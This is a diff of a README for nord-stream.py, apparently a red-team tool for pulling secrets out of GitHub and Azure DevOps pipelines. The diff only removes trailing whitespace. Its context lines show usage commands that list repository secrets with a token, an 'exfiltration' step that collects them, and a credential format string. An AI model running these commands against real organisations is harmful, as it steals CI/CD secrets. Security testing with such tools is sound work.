@@ -60,7 +60,7 @@ $ nord-stream.py github --token "$GHP" --org org --list-secrets --repo repo
 
 Then proceed to the exfiltration:
 ```sh
-$ nord-stream.py github --token "$GHP" --org org --repo repo  
+$ nord-stream.py github --token "$GHP" --org org --repo repo
 [+] "org/repo"
 [*] No branch protection rule found on "dev_remote_ea5Eu/test/v1" branch
 [*] Getting secrets from repo: "org/repo"
@@ -240,7 +240,7 @@ hostname:::port:::user:::password:::privatekey
 
 If you want to run it on a self-hosted runner you can do the following:
 ```
-$ nord-stream.py devops ... --build-yaml test.yml --build-type ssh  
+$ nord-stream.py devops ... --build-yaml test.yml --build-type ssh
 [+] YAML file:
 trigger: none
 pool:
